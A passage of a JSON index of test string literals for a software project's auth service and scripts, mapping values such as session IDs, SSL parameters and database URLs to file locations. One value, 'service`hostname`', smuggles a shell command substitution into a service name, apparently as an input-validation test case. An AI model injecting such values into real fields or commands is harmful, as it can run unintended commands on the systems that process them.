        "auth_service/tests/integration/test_auth_oauth_errors.py:263"
      ]
    },
    "server_startup": {
      "value": "server_startup",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:37",
        "scripts/test_websocket_dev_mode.py:72"
      ]
    },
    "service": {
      "value": "service",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:52",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:289",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:500",
        "auth_service/tests/factories/permission_factory.py:225",
        "auth_service/tests/integration/test_oauth_flows_sync.py:66",
        "auth_service/tests/test_auth_startup_integration.py:122",
        "auth_service/tests/test_auth_startup_integration.py:149",
        "auth_service/tests/test_auth_token_generation.py:146",
        "auth_service/tests/test_auth_token_generation.py:147",
        "auth_service/tests/test_auth_token_generation.py:161"
      ]
    },
    "service health check failed:": {
      "value": "service health check failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:213"
      ]
    },
    "service is healthy": {
      "value": "service is healthy",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:206"
      ]
    },
    "service returned": {
      "value": "service returned",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:209"
      ]
    },
    "service unavailable": {
      "value": "service unavailable",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:94"
      ]
    },
    "service-\nname": {
      "value": "service-\nname",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:294"
      ]
    },
    "service-123": {
      "value": "service-123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:134"
      ]
    },
    "service-name$": {
      "value": "service-name$",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:296"
      ]
    },
    "service1": {
      "value": "service1",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:164",
        "scripts/test_coordination_fixes.py:176"
      ]
    },
    "service2": {
      "value": "service2",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:167",
        "scripts/test_coordination_fixes.py:177"
      ]
    },
    "service:auth_validate": {
      "value": "service:auth_validate",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:34"
      ]
    },
    "service:read": {
      "value": "service:read",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:108"
      ]
    },
    "service:session_create": {
      "value": "service:session_create",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:36"
      ]
    },
    "service:session_revoke": {
      "value": "service:session_revoke",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:37"
      ]
    },
    "service:user_lookup": {
      "value": "service:user_lookup",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:35"
      ]
    },
    "service:write": {
      "value": "service:write",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:108"
      ]
    },
    "service_discovery": {
      "value": "service_discovery",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:45"
      ]
    },
    "service_discovery         → test_09_service_discovery_timing_issues": {
      "value": "service_discovery         → test_09_service_discovery_timing_issues",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:395"
      ]
    },
    "service_id": {
      "value": "service_id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:227"
      ]
    },
    "service_registry": {
      "value": "service_registry",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:43"
      ]
    },
    "service_results": {
      "value": "service_results",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:397"
      ]
    },
    "service_secret": {
      "value": "service_secret",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:228"
      ]
    },
    "service_token": {
      "value": "service_token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:217"
      ]
    },
    "service_unavailable": {
      "value": "service_unavailable",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:122"
      ]
    },
    "service`hostname`": {
      "value": "service`hostname`",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:292"
      ]
    },
    "services": {
      "value": "services",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:368",
        "scripts/compliance/demo_test_size_enforcement.py:68",
        "scripts/test_staging_deployment.py:28",
        "scripts/test_staging_deployment.py:91"
      ]
    },
    "services/test_synthetic_data_service_v3.py": {
      "value": "services/test_synthetic_data_service_v3.py",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:207"
      ]
    },
    "session": {
      "value": "session",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:346",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:908",
        "scripts/analyze_test_mocks.py:36",
        "scripts/auto_fix_test_sizes.py:338",
        "scripts/standardize_l3_test_names.py:204"
      ]
    },
    "session1": {
      "value": "session1",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:201",
        "auth_service/tests/test_session_management.py:266",
        "auth_service/tests/test_session_management.py:376"
      ]
    },
    "session123": {
      "value": "session123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:545",
        "auth_service/tests/test_session_management.py:90",
        "auth_service/tests/test_session_management.py:105",
        "auth_service/tests/test_session_management.py:146",
        "auth_service/tests/test_session_management.py:172",
        "auth_service/tests/test_session_management.py:257",
        "auth_service/tests/test_session_management.py:288",
        "auth_service/tests/test_session_management.py:296"
      ]
    },
    "session2": {
      "value": "session2",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:202",
        "auth_service/tests/test_session_management.py:267",
        "auth_service/tests/test_session_management.py:377"
      ]
    },
    "session:": {
      "value": "session:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:140"
      ]
    },
    "session:expired123": {
      "value": "session:expired123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:248"
      ]
    },
    "session:session1": {
      "value": "session:session1",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:205",
        "auth_service/tests/test_session_management.py:209",
        "auth_service/tests/test_session_management.py:224",
        "auth_service/tests/test_session_management.py:228",
        "auth_service/tests/test_session_management.py:270",
        "auth_service/tests/test_session_management.py:368"
      ]
    },
    "session:session123": {
      "value": "session:session123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:260"
      ]
    },
    "session:session2": {
      "value": "session:session2",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:205",
        "auth_service/tests/test_session_management.py:211",
        "auth_service/tests/test_session_management.py:224",
        "auth_service/tests/test_session_management.py:230",
        "auth_service/tests/test_session_management.py:270",
        "auth_service/tests/test_session_management.py:370"
      ]
    },
    "session_1": {
      "value": "session_1",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_state_security.py:187",
        "auth_service/tests/unit/test_oauth_state_security.py:188",
        "auth_service/tests/unit/test_oauth_state_security.py:194",
        "auth_service/tests/unit/test_oauth_state_security.py:195",
        "auth_service/tests/unit/test_oauth_state_security.py:198",
        "auth_service/tests/unit/test_oauth_state_security.py:199",
        "auth_service/tests/unit/test_oauth_state_security.py:202",
        "auth_service/tests/unit/test_oauth_state_security.py:203"
      ]
    },
    "session_a": {
      "value": "session_a",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_state_security.py:134",
        "auth_service/tests/unit/test_oauth_state_security.py:137",
        "auth_service/tests/unit/test_oauth_state_security.py:140"
      ]
    },
    "session_b": {
      "value": "session_b",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_state_security.py:141"
      ]
    },
    "session_created": {
      "value": "session_created",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:29"
      ]
    },
    "session_expired": {
      "value": "session_expired",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:30"
      ]
    },
    "session_id": {
      "value": "session_id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:156",
        "auth_service/tests/integration/test_auth_oauth_errors.py:202",
        "auth_service/tests/integration/test_auth_oauth_errors.py:279",
        "auth_service/tests/integration/test_auth_oauth_errors.py:359",
        "auth_service/tests/integration/test_auth_oauth_errors.py:402",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:153",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:194",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:328",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:337",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:852"
      ]
    },
    "session_limits_enforced": {
      "value": "session_limits_enforced",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:296"
      ]
    },
    "session_manager": {
      "value": "session_manager",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:172"
      ]
    },
    "session_type": {
      "value": "session_type",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:157"
      ]
    },
    "sessions": {
      "value": "sessions",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_client.py:220"
      ]
    },
    "setUp": {
      "value": "setUp",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:210"
      ]
    },
    "setup": {
      "value": "setup",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:640",
        "scripts/compliance/test_refactor_helper.py:210",
        "scripts/compliance/test_refactor_helper.py:211"
      ]
    },
    "setup_method": {
      "value": "setup_method",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:210"
      ]
    },
    "setup_test_path": {
      "value": "setup_test_path",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_import_order.py:27",
        "scripts/check_test_import_order.py:33"
      ]
    },
    "setup_test_path()": {
      "value": "setup_test_path()",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_order.py:27"
      ]
    },
    "setup_test_path() not called": {
      "value": "setup_test_path() not called",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_import_order.py:52"
      ]
    },
    "setup_test_path\\(\\)\\n": {
      "value": "setup_test_path\\(\\)\\n",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_utils_imports.py:36"
      ]
    },
    "severities": {
      "value": "severities",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:165",
        "scripts/compliance/fake_test_scanner.py:169",
        "scripts/compliance/fake_test_scanner.py:175",
        "scripts/compliance/fake_test_scanner.py:175",
        "scripts/compliance/fake_test_scanner.py:287"
      ]
    },
    "severity": {
      "value": "severity",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:290",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:431",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:483",
        "scripts/business_value_test_index.py:662",
        "scripts/business_value_test_index.py:670",
        "scripts/business_value_test_index.py:680",
        "scripts/business_value_test_index.py:760"
      ]
    },
    "severity_breakdown": {
      "value": "severity_breakdown",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:261",
        "scripts/remove_test_stubs.py:315"
      ]
    },
    "share": {
      "value": "share",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:28"
      ]
    },
    "shared_utilities": {
      "value": "shared_utilities",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:332",
        "scripts/compliance/test_refactor_helper.py:355",
        "scripts/compliance/test_refactor_helper.py:564"
      ]
    },
    "short": {
      "value": "short",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:297",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:42",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:52"
      ]
    },
    "should be blocked": {
      "value": "should be blocked",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:82"
      ]
    },
    "should be refactored manually": {
      "value": "should be refactored manually",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:619"
      ]
    },
    "should be rejected": {
      "value": "should be rejected",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:104"
      ]
    },
    "should have failed": {
      "value": "should have failed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1064"
      ]
    },
    "should not decode successfully": {
      "value": "should not decode successfully",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1044"
      ]
    },
    "should_be_valid": {
      "value": "should_be_valid",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:186",
        "scripts/test_database_url_builder_comprehensive.py:197",
        "scripts/test_database_url_builder_comprehensive.py:208",
        "scripts/test_database_url_builder_comprehensive.py:219",
        "scripts/test_database_url_builder_comprehensive.py:230",
        "scripts/test_database_url_builder_comprehensive.py:238"
      ]
    },
    "should_have_ssl": {
      "value": "should_have_ssl",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:111",
        "scripts/test_ssl_certificates_staging.py:116",
        "scripts/test_ssl_certificates_staging.py:148",
        "scripts/test_ssl_certificates_staging.py:150"
      ]
    },
    "should_pass": {
      "value": "should_pass",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:352",
        "auth_service/tests/test_staging_database_credentials.py:360",
        "auth_service/tests/test_staging_database_credentials.py:368",
        "auth_service/tests/test_staging_database_credentials.py:376",
        "auth_service/tests/test_staging_database_credentials.py:395",
        "auth_service/tests/test_staging_database_credentials.py:398"
      ]
    },
    "shutdown failed:": {
      "value": "shutdown failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:453"
      ]
    },
    "side_effect =": {
      "value": "side_effect =",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:359"
      ]
    },
    "signal_handling": {
      "value": "signal_handling",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:281",
        "auth_service/tests/test_five_whys_reproduction.py:306"
      ]
    },
    "signature": {
      "value": "signature",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:88",
        "netra_backend/app/services/realistic_test_data/models.py:93",
        "netra_backend/app/services/realistic_test_data/models.py:98",
        "netra_backend/app/services/realistic_test_data/models.py:103",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:383",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:512"
      ]
    },
    "signature verification failed": {
      "value": "signature verification failed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:117"
      ]
    },
    "signature-user-789": {
      "value": "signature-user-789",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:135"
      ]
    },
    "signature@example.com": {
      "value": "signature@example.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:136"
      ]
    },
    "signup": {
      "value": "signup",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:356"
      ]
    },
    "similar": {
      "value": "similar",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:327",
        "scripts/analyze_test_overlap.py:359",
        "scripts/analyze_test_overlap.py:353",
        "scripts/analyze_test_overlap.py:383",
        "scripts/analyze_test_overlap.py:384",
        "scripts/analyze_test_overlap.py:531",
        "scripts/analyze_test_overlap.py:659"
      ]
    },
    "similarity": {
      "value": "similarity",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:426",
        "scripts/analyze_test_overlap.py:578"
      ]
    },
    "similarity relationships": {
      "value": "similarity relationships",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:79"
      ]
    },
    "similarity_type": {
      "value": "similarity_type",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:635"
      ]
    },
    "simple": {
      "value": "simple",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:163",
        "netra_backend/app/agents/test_agent_initialization.py:167",
        "scripts/unified_test_runner.py:822",
        "scripts/unified_test_runner.py:823"
      ]
    },
    "site-packages": {
      "value": "site-packages",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:130",
        "scripts/compliance/project_test_validator.py:101",
        "scripts/compliance/real_test_requirements_enforcer.py:134",
        "scripts/compliance/test_size_validator.py:156",
        "scripts/generate_test_audit.py:24",
        "scripts/test_exclusion_check.py:20"
      ]
    },
    "size": {
      "value": "size",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:321"
      ]
    },
    "skip": {
      "value": "skip",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:166"
      ]
    },
    "skipped": {
      "value": "skipped",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:328",
        "scripts/unified_test_runner.py:629",
        "scripts/unified_test_runner.py:699"
      ]
    },
    "skipped tests": {
      "value": "skipped tests",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:288"
      ]
    },
    "skipped_tests": {
      "value": "skipped_tests",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:167"
      ]
    },
    "sleep": {
      "value": "sleep",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:60",
        "scripts/autonomous_review/test_reviewer.py:164"
      ]
    },
    "sleep(": {
      "value": "sleep(",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:281"
      ]
    },
    "slow": {
      "value": "slow",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:99"
      ]
    },
    "slow tests to improve CI/CD speed": {
      "value": "slow tests to improve CI/CD speed",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:269"
      ]
    },
    "slow-db-host": {
      "value": "slow-db-host",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:286"
      ]
    },
    "smart_adaptive": {
      "value": "smart_adaptive",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:815"
      ]
    },
    "smoke": {
      "value": "smoke",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:69",
        "scripts/iterative_test_fix_loop.py:31",
        "scripts/simple_test_fix_loop.py:18",
        "scripts/test_backend.py:35",
        "scripts/test_backend_optimized.py:83",
        "scripts/test_frontend.py:37",
        "scripts/test_frontend_simple.py:36",
        "scripts/test_frontend_simple.py:59",
        "scripts/test_frontend_simple.py:76",
        "scripts/unified_test_config.py:22"
      ]
    },
    "soak": {
      "value": "soak",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:101"
      ]
    },
    "socket": {
      "value": "socket",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:225",
        "scripts/analyze_test_mocks.py:48"
      ]
    },
    "span_id": {
      "value": "span_id",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:60"
      ]
    },
    "spec.": {
      "value": "spec.",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:99"
      ]
    },
    "specific_run_id": {
      "value": "specific_run_id",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:153"
      ]
    },
    "split_by_": {
      "value": "split_by_",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:717"
      ]
    },
    "split_by_category": {
      "value": "split_by_category",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:441"
      ]
    },
    "split_by_class": {
      "value": "split_by_class",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:481"
      ]
    },
    "split_by_feature": {
      "value": "split_by_feature",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:514"
      ]
    },
    "splitting large file:": {
      "value": "splitting large file:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:338"
      ]
    },
    "splitting_suggestions": {
      "value": "splitting_suggestions",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:495",
        "scripts/compliance/test_size_validator.py:498"
      ]
    },
    "sql_injection": {
      "value": "sql_injection",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:82",
        "auth_service/tests/test_security.py:143",
        "auth_service/tests/test_security.py:190",
        "auth_service/tests/test_security.py:225",
        "auth_service/tests/test_security.py:628",
        "auth_service/tests/test_security.py:689",
        "auth_service/tests/test_security.py:696"
      ]
    },
    "sqlalchemy": {
      "value": "sqlalchemy",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:36"
      ]
    },
    "sqlalchemy.ext.asyncio.create_async_engine": {
      "value": "sqlalchemy.ext.asyncio.create_async_engine",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:72",
        "auth_service/tests/test_critical_staging_database_failures.py:124",
        "auth_service/tests/test_critical_staging_database_failures.py:173",
        "auth_service/tests/test_critical_staging_database_failures.py:265",
        "auth_service/tests/test_critical_staging_database_failures.py:301"
      ]
    },
    "sqlite": {
      "value": "sqlite",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_connection.py:21",
        "auth_service/tests/test_auth_database_connection.py:34",
        "auth_service/tests/test_auth_database_connection.py:77"
      ]
    },
    "sqlite+aiosqlite:///": {
      "value": "sqlite+aiosqlite:///",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:133"
      ]
    },
    "sqlite+aiosqlite:///:memory:": {
      "value": "sqlite+aiosqlite:///:memory:",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:10",
        "auth_service/tests/config/test_env.py:28",
        "auth_service/tests/config/test_env.py:29",
        "auth_service/tests/config/test_env.py:135",
        "auth_service/tests/config/test_env.py:163",
        "auth_service/tests/config/test_env.py:172",
        "auth_service/tests/config/test_env.py:182",
        "auth_service/tests/config/test_settings.py:15",
        "auth_service/tests/database/test_config.py:24",
        "auth_service/tests/test_auth_startup_integration.py:45"
      ]
    },
    "sqlite+aiosqlite:///test_auth.db": {
      "value": "sqlite+aiosqlite:///test_auth.db",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/conftest.py:32"
      ]
    },
    "sqlite://": {
      "value": "sqlite://",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_manager.py:210"
      ]
    },
    "sqlite:///test.db": {
      "value": "sqlite:///test.db",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:173"
      ]
    },
    "src": {
      "value": "src",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:185"
      ]
    },
    "ssl": {
      "value": "ssl",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:370",
        "auth_service/tests/test_critical_staging_database_failures.py:275",
        "auth_service/tests/test_staging_auth_ssl_failures.py:187",
        "scripts/test_auth_database_sessions.py:97",
        "scripts/test_auth_database_sessions.py:258",
        "scripts/test_ssl_certificates_staging.py:143",
        "scripts/test_ssl_certificates_staging.py:144"
      ]
    },
    "ssl parameter missing for regular connection": {
      "value": "ssl parameter missing for regular connection",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:117"
      ]
    },
    "ssl.create_default_context": {
      "value": "ssl.create_default_context",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:357"
      ]
    },
    "ssl=": {
      "value": "ssl=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_manager.py:42",
        "auth_service/tests/test_database_manager.py:58",
        "auth_service/tests/test_database_manager.py:84",
        "auth_service/tests/test_five_whys_reproduction.py:374",
        "auth_service/tests/test_staging_auth_ssl_failures.py:57",
        "auth_service/tests/test_staging_auth_ssl_failures.py:84",
        "auth_service/tests/test_staging_auth_ssl_failures.py:116",
        "auth_service/tests/test_staging_auth_ssl_failures.py:175",
        "auth_service/tests/test_staging_auth_ssl_failures.py:178",
        "auth_service/tests/test_staging_auth_ssl_failures.py:287"
      ]
    },
    "ssl=disable": {
      "value": "ssl=disable",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:253"
      ]
    },
    "ssl=require": {
      "value": "ssl=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:67",
        "auth_service/tests/test_cloud_sql_url.py:69",
        "auth_service/tests/test_database_manager.py:74",
        "auth_service/tests/test_database_manager.py:137",
        "auth_service/tests/test_database_manager.py:229",
        "auth_service/tests/test_five_whys_reproduction.py:251",
        "auth_service/tests/test_five_whys_reproduction.py:258",
        "auth_service/tests/test_postgres_compliance.py:67"
      ]
    },
    "ssl_parameter_resolution": {
      "value": "ssl_parameter_resolution",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:301",
        "auth_service/tests/test_five_whys_reproduction.py:310"
      ]
    },
    "ssl_status": {
      "value": "ssl_status",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:371",
        "auth_service/tests/auth-service-down-critical-scenarios.py:371"
      ]
    },
    "sslcert=": {
      "value": "sslcert=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:84"
      ]
    },
    "sslkey=": {
      "value": "sslkey=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:84"
      ]
    },
    "sslmode": {
      "value": "sslmode",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_manager.py:137"
      ]
    },
    "sslmode not converted to ssl": {
      "value": "sslmode not converted to ssl",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:114"
      ]
    },
    "sslmode=": {
      "value": "sslmode=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:69",
        "auth_service/tests/test_cloud_sql_url.py:70",
        "auth_service/tests/test_database_manager.py:41",
        "auth_service/tests/test_database_manager.py:75",
        "auth_service/tests/test_database_manager.py:83",
        "auth_service/tests/test_database_manager.py:230",
        "auth_service/tests/test_five_whys_reproduction.py:239",
        "auth_service/tests/test_five_whys_reproduction.py:259",
        "auth_service/tests/test_five_whys_reproduction.py:374",
        "auth_service/tests/test_postgres_compliance.py:68"
      ]
    },
    "sslmode=disable": {
      "value": "sslmode=disable",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:252",
        "auth_service/tests/test_five_whys_reproduction.py:253"
      ]
    },
    "sslmode=require": {
      "value": "sslmode=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_manager.py:57",
        "auth_service/tests/test_database_manager.py:224",
        "auth_service/tests/test_five_whys_reproduction.py:250",
        "auth_service/tests/test_five_whys_reproduction.py:251",
        "auth_service/tests/test_postgres_compliance.py:74"
      ]
    },
    "sslrootcert=": {
      "value": "sslrootcert=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:84"
      ]
    },
    "stable_with_noise": {
      "value": "stable_with_noise",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:103"
      ]
    },
    "stage": {
      "value": "stage",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:319",
        "auth_service/tests/integration/test_auth_oauth_errors.py:325",
        "auth_service/tests/integration/test_auth_oauth_errors.py:331",
        "auth_service/tests/integration/test_auth_oauth_errors.py:337",
        "auth_service/tests/integration/test_auth_oauth_errors.py:344"
      ]
    },
    "staging": {
      "value": "staging",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:31",
        "auth_service/test_staging_db_connection.py:36",
        "auth_service/test_staging_db_connection.py:123",
        "auth_service/test_url_construction.py:32",
        "auth_service/test_url_construction.py:62",
        "auth_service/test_url_construction.py:188",
        "auth_service/tests/test_auth_startup_integration.py:228",
        "auth_service/tests/test_cloud_sql_url.py:24",
        "auth_service/tests/test_cloud_sql_url.py:53",
        "auth_service/tests/test_critical_oauth_environment_failures.py:43"
      ]
    },
    "staging mode": {
      "value": "staging mode",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:149"
      ]
    },
    "staging-db-host": {
      "value": "staging-db-host",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:198",
        "auth_service/tests/test_critical_staging_database_failures.py:326",
        "auth_service/tests/test_critical_staging_database_failures.py:374",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:172"
      ]
    },
    "staging-quick": {
      "value": "staging-quick",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:98"
      ]
    },
    "staging-real": {
      "value": "staging-real",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:104"
      ]
    },
    "staging-shared-postgres.c7vdhks7dj2k.us-central1.gcp.cloud.sql.googleapis.com": {
      "value": "staging-shared-postgres.c7vdhks7dj2k.us-central1.gcp.cloud.sql.googleapis.com",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:92"
      ]
    },
    "staging-workflows": {
      "value": "staging-workflows",
      "category": "test_literals",
      "locations": [
